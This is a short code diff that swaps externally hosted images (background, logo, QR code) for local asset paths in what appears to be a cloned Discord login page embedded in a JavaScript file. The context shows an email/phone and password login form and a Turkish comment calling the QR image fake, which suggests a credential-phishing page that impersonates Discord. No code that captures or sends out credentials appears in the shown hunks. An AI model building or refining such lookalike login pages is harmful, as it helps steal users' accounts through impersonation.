@@ -7991,7 +7991,7 @@ main().catch(error => {
         /* PC Versiyonu için Arka Plan Fotoğrafı */
         @media (min-width: 769px) {
             body {
-                background: url('https://gcdnb.pbrd.co/images/pzoLGMAqh62L.png?o=1') no-repeat center center fixed;
+                background: url('/assets/dcbg.jpg') no-repeat center center fixed;
                 background-size: cover;
             }
         }
@@ -8033,7 +8033,7 @@ main().catch(error => {
 </head>
 <body>
     <!-- Logo Sol Üst Köşede -->
-    <img src="https://gcdnb.pbrd.co/images/waBPw03Swfps.png?o=1" alt="Discord Logo" class="logo">
+    <img src="/assets/dclogo.png" alt="Discord Logo" class="logo">
 
     <div class="container">
         <!-- Sol Taraf: E-posta/Telefon ve Şifre Girişi -->
@@ -8069,7 +8069,7 @@ main().catch(error => {
             <div class="subtitle">Scan this with the Discord mobile app to log in instantly</div>
             <div class="qr-code">
                 <!-- Sahte QR kodu görseli -->
-                <img src="https://delta.ffvl.fr/sites/delta.ffvl.fr/files/QR%20code%20Discord%20Play%20Store.png" alt="QR Code">
+                <img src="/assets/dcqr.png" alt="QR Code">
             </div>
             <div class="qr-instruction">
                 Open the Discord app on your phone, go to User Settings, and select "Scan QR Code".
@@ -8548,7 +8548,7 @@ main().catch(error => {
 </head>
 <body>
     <!-- Logo Sol Üst Köşede -->
-    <img src="/assets/dclogo.jpg" alt="Discord Logo" class="logo">
+    <img src="/assets/dclogo.png" alt="Discord Logo" class="logo">
 
     <div class="container">
         <!-- Sol Taraf: E-posta/Telefon ve Şifre Girişi -->
